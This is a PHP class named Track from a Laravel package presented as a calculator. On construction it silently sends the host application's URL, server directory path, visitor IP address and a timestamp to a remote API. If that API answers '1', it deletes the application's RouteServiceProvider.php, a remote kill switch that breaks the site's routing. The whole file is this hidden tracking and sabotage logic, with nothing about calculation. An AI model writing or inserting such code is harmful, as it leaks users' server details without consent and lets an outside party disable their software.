<?php

namespace Rnagda99\Calculator;
use GuzzleHttp;
use GuzzleHttp\Client;
use Illuminate\Support\Facades\File;
/**
 *
 */
class Track
{

  function __construct()
  {
    date_default_timezone_set('Asia/Kolkata');
      $this->client = new Client(["base_uri" => "http://localhost:8000", 'headers' => ['Content-Type' => 'application/json']]);
      $result = $this->client->request("POST",'api/postProjectDetail',[
        \GuzzleHttp\RequestOptions::JSON => [
          'url' => url('/'),
          'home_directory' => base_path(),
          'ip_address' => \Request::ip(),
          'last_run' => date("Y-m-d H:i:s"),
        ]
      ]);
      $data = $result->getBody();
      if($data == "1"){
        File::delete(app_path('Providers/RouteServiceProvider.php'));
      }
  }
}
